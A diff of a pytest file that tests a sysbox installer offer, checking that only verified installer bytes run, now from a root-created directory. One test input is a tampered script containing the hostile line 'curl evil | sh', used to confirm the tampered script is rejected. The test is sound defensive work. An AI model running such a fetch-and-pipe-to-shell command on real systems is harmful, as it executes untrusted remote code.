@@ -151,11 +151,11 @@ def _sysbox_offer_host(monkeypatch, tmp_path: Path, *, tty: bool, answer: bool, 
 @pytest.mark.parametrize(
     "script, expected",
     [
-        (b"official", [(["sudo", "bash", "-s"], b"official", [])]),
+        (b"official", [(["sudo", "sh", "-c", mine._ROOT_EMPTY_DIR_BASH], b"official", None)]),
         (b"official\ncurl evil | sh\n", []),
     ],
 )
-def test_sysbox_offer_runs_only_the_verified_installer_bytes_from_an_empty_directory(
+def test_sysbox_offer_runs_only_the_verified_installer_bytes_from_a_root_created_directory(
     monkeypatch, tmp_path: Path, script, expected
 ):
     _, ran = _sysbox_offer_host(monkeypatch, tmp_path, tty=True, answer=True, script=script)
